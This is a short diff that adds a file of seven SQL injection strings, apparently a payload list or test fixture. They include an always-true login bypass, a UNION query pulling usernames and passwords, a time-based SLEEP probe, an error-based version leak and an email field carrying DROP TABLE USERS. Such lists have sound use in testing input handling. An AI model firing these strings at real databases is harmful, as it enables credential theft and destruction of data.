@@ -1,0 +1,7 @@
+'OR '1' = '1'; --
+'UNION SELECT USERNAME, PASSWORD FROM USERS;= 
+'AND 1 = 1;--
+;IF(1=1, SLEEP(5),0);--
+'OR 1=convert(int, @@Version);--
+USER@example.com; 
+DROP TABLE USERS;--
